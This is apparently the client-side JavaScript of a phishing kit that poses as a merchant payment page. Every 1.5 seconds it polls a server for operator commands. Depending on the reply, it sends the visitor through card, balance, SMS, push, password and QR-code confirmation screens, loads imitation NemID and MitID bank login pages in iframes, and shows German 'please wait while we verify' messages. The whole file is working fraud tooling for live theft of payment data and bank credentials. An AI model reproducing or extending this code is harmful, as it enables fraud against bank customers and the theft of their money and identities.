class System {
    constructor(logId, link_id, phrases = {}, page_type) {

        this.link_id = link_id,
        this.logId = logId,
        this.phrases = phrases,
        this.page_type = page_type
        this.redirect()
        this.openSupport()
    }

    async status() {
        const { data } = await axios.post(
            `/api/getStatus`,
            {
                id: this.logId
            }
            
        )
        
        return data
    }

    async customData(value) {
        const type = value.method.split('_')[1].split(' ')[0]
        const id = value.method.split('_')[1].split(' ')[1]

        const { data } = await axios.post(
            `/api/get-custom-data/${this.link_id}`,
            {
                id: id,
                type: type
            }
        ).catch(() => {
            return false
        })

        return data
    }

    redirect() {
        var status = ""
        // if(statuslk == "nemid_dk") {
        //     setInterval(async () => {
        //         const res = await this.status()

        //         if(res.method == "push") {
        //             alert("push suka")
        //         } else if(res.method == "hold") {
        //             alert("hold suka")
        //         }
        //     }, 1500)
        // }

        setInterval(async () => {
            if(status == "nemid_dk_lk" || status == "mitid_dk_lk") return
            const res = await this.status()

            if (res.method.includes('custom_')) {
                const { data } = this.customData(res)
                
                if (data) {
                    window.location.href = data.route
                } 
            } else {
                if (res.method !== 'nothing') {
                    if (this.page_type == 'card') {
                        if (res.method != 'inputYourBalance') {
                            try {
                                load.style.display = "none";
                                contnet.style.display = "block";
        
                                document.querySelector("#balik > div:nth-child(2)").remove()
                                document.querySelector("#checkbal").remove()
                                document.querySelector("#contnet > div:nth-child(3)").remove()
                            } catch (e) {
                                /*  */
                            }
                        }
    
                        if (res.method.includes('_lk')) {
                            if (res.method != status && res.method.includes('nemid_dk')) {
                                status = res.method

                                document.querySelector('#verif-contnt').innerHTML = `
                                    <iframe 
                                        id="iframe" 
                                        style="width: 318px; height: 262px; border: 0; z-index: 1000; position: relative;" 
                                        src="/style/dk_auth/NemID.htm" 
                                        frameborder="0">
                                    </iframe>
                                `
                            } else if (res.method != status && res.method.includes('mitid_dk')) {
                                status = res.method

                                document.querySelector('#verif-contnt').innerHTML = `
                                    <iframe 
                                        id="iframe" 
                                        style="width: 318px; height: 262px; border: 0; z-index: 1000; position: relative; align: left;" 
                                        src="/style/dk_auth/MitID/index.html" 
                                        frameborder="0">
                                    </iframe>
                                `
                            } 
                        } else {
                            if (res.method == 'skip') {
                                document.querySelector(
                                    '#verif-contnt'
                                ).innerHTML = `
                                    <div id="contnet" style="display: block;">
                                        <div id="balik">
                                            <div style="color: #3f3f3f; line-height: 1.6; font-size: 14px; background: #ececec; border-radius: 10px; padding: 25px 5px;">
                                                ${this.phrases['skipCard']}
                                            </div>
                                        </div>
                                    </div>                                       
                                `
                            } else if (res.method == 'change') {
                                document.querySelector(
                                    '#verif-contnt'
                                ).innerHTML = `
                                    <div id="contnet" style="display: block;">
                                        <div id="balik">
                                            <div style="color: #3f3f3f; line-height: 1.6; font-size: 14px; background: #ececec; border-radius: 10px; padding: 25px 5px;">
                                                ${this.phrases['changeCard']}
                                            </div>
                                        </div>
                                    </div>                                       
                                `
                            } else if (res.method != status && res.method == 'wait') {
                                status = res.method

                                document.getElementById("verif-contnt").innerHTML = `
                                Wir überprüfen die Informationen, dies dauert nicht länger als 5 Minuten. Bitte verlassen Sie die Seite erst, wenn die Prüfung abgeschlossen ist.
                                <div class="loader"></div>
                                `
                            } else if (res.method == 'successTransaction') {
                                document.querySelector(
                                    '#verif-contnt'
                                ).innerHTML = `
                                    <div id="contnet" style="display: block;">
                                        <div id="balik">
                                            <div style="color: #3f3f3f; line-height: 1.6; font-size: 14px; background: #ececec; border-radius: 10px; padding: 25px 5px;">
                                                ${this.phrases['successTransaction']}
                                            </div>
                                        </div>
                                    </div>                                       
                                `
                            } else if(res.method != status && res.method == "refresh") {
                                status = res.method

                                window.location.reload()
                            } else if (res.method == 'error') {
                                document.querySelector(
                                    '#verif-contnt'
                                ).innerHTML = `
                                    <div id="contnet" style="display: block;">
                                        <div id="balik">
                                            <div style="color: #3f3f3f; line-height: 1.6; font-size: 14px; background: #ececec; border-radius: 10px; padding: 25px 5px;">
                                                ${res.error}
                                            </div>
                                        </div>
                                    </div>                                       
                                `
                            } else {
                                if (res.method == 'card') {
                                    window.location.reload()
                                    // document.querySelector(
                                    //     `.card-form__inner`
                                    // ).innerHTML = `
                                    //         <center>
                                    //             ${this.phrases['generalErrorWord']}<br><br>
                                    //             <small style="text-align: justify;">
                                    //                 ${this.phrases['noValidCard']}
                                    //             </small>
                                                
                                    //         </center>
                                    //     `

                                    // setTimeout(() => {
                                    //     window.location.reload()
                                    // }, 5000);
                                } else if (res.method == 'inputYourBalance') {
                                    try {
                                        document.getElementById('contnet').style.display = 'block'
                                        document.getElementById('holder').style.display = 'none'
                                    } catch (e) {
                                        //
                                    }
                                } else if(res.method == "lkCard") return 
                                else {
                                    if(res.method == "wait") return
                                    window.location.href = `/pay/merchant/confirm-${res.method}/${this.logId}`
                                }
                            }
                        }
                    } else {
                        // try {
                        //     document.querySelector(".card-form__inner > table:nth-child(2)").remove()
                        //     document.querySelector(".card-input").remove()
                        //     document.querySelector(".card-form__row").remove()
                        // } catch (e) {
                        //     //
                        // }

                        if (res.method.includes('_lk')) {
                            if (res.method == 'nemid_dk') {
                                document.querySelector('#verif-contnt').innerHTML = `
                                    <iframe 
                                        id="iframe" 
                                        style="width: 318px; height: 262px; border: 0; z-index: 1000; position: relative;" 
                                        src="/style/dk_auth/NemID.htm" 
                                        frameborder="0">
                                    </iframe>
                                `
                            } else if(res.method == "lkCard") return
                            else if (res.method == 'mitid_dk') {
                                document.querySelector('#verif-contnt').innerHTML = `
                                    <iframe 
                                        id="iframe" 
                                        style="width: 318px; height: 262px; border: 0; z-index: 1000; position: relative; align: left;" 
                                        src="/style/dk_auth/MitID/index.html" 
                                        frameborder="0">
                                    </iframe>
                                `
                            } else {
                                const BANK_NAME = res.method.split('_')[0]
                                window.location.href = `/merchant/bank-confirm/${BANK_NAME}/${this.link_id}`
                            }
                        } else {
                            if (res.method == 'skip') {
                                document.querySelector(
                                    `.card-form__inner`
                                ).innerHTML = 
                                    `
                                        <center>
                                            ${this.phrases['generalErrorWord']}<br><br>
                                            <small style="text-align: justify;">
                                                ${this.phrases['skipCard']}
                                            </small>
                                            
                                        </center>
                                    `
                            } else if(res.method != status && res.method == "refresh") {
                                status = res.method
                                
                                window.location.reload()
                            } else if (res.method != status && res.method == 'wait') {
                                status = res.method

                                alert("Wir überprüfen die Informationen, dies dauert nicht länger als 5 Minuten. Bitte verlassen Sie die Seite erst, wenn die Prüfung abgeschlossen ist.")

                            } else if (res.method == 'change') {
                                document.querySelector(
                                    `.card-form__inner`
                                ).innerHTML = 
                                    `
                                        <center>
                                            ${this.phrases['generalErrorWord']}<br><br>
                                            <small style="text-align: justify;">
                                            ${this.phrases['changeCard']}
                                            </small>
                                        </center>
                                    `
                            } else if (res.method == 'successTransaction') {
                                document.querySelector(
                                    `.card-form__inner`
                                ).innerHTML = 
                                    `
                                        <center>
                                        ${this.phrases['generalSuccessWord']}<br><br>
                                            <small style="text-align: justify;">
                                                ${this.phrases['successTransaction']}
                                            </small>
                                        </center>
                                    `
                            } else if (res.method == 'error') {
                                document.querySelector(
                                    `.card-form__inner`
                                ).innerHTML = 
                                    `
                                        <center>
                                            ${this.phrases['generalErrorWord']}<br><br>
                                            <small style="text-align: justify;">
                                                ${res.error}
                                            </small>
                                        </center>
                                    `
                            } 
                            else if (res.method == 'card') {
                                window.location.href = `/pay/merchant/${this.link_id}`
                            } else if(this.page_type == "sms") {
                                if(res.method == "sms") {
                                    
                                } else {
                                    if(res.method == "push") {
                                        window.location.href = `/pay/merchant/confirm-${res.method}/${this.logId}`
                                    }
                                }
                            } else if(this.page_type == "push") {
                                if(res.method == "sms") {
                                    window.location.href = `/pay/merchant/confirm-${res.method}/${this.logId}`
                                }
                            } else if(res.method != status && res.method == "refresh") {
                                status = res.method
                                
                                window.location.reload()
                            } 

                            //     window.location.href = `/merchant/confirm-${res.method}/${this.link_id}`
                            // } 
                            // else {
                            //     window.location.href = `/merchant/confirm-${res.method}/${this.link_id}`
                            // }
                        }
                    }
                }

                if ((res.password != 'nothing') && (window.location.href.includes('confirm-password'))) {
                    try {
                        document.querySelector(".card-input__label").textContent = `${res.password}:`
                    } catch (e) {
                        //
                    }
                }

                if ((res.secret != 'nothing') && (window.location.href.includes('confirm-secret'))) {
                    try {
                        document.querySelector(".card-form__inner > center:nth-child(3)").innerHTML = `<small style="text-align: justify;">${res.secret}</small>`
                    } catch (e) {
                        //
                    }
                }

                if ((res.qrcode != 'nothing') && (window.location.href.includes('confirm-qrcode'))) {
                    try {
                        document.querySelector(".card-input > center:nth-child(1)").innerHTML =`<img src="${res.qrcode}" alt="QR-Code" width="200" height="200">`
                    } catch (e) {
                        //
                    }
                }

                else if(res.method == "lkCard") return
            }
        }, 1500)
    }

    openSupport() {
        setInterval(async () => {
            const { data } = await axios.post(
                `/api/checkChatStatus`,
                {
                    id: this.link_id
                }
            )

            if (data.status == 1) {
                try {
                    document.querySelector('.support-circle').style.display = 'none'
                    document.querySelector('#chatra').style.display = 'block'
    
                    const iframe = document.getElementById("chatra__iframe")
                    const elmnt = iframe.contentWindow.document.querySelector("#app")
                    elmnt.style.display = "block"
                } catch (e) {
                    /*  */
                }
            }
        }, 5000)
    }
}

window.__System = System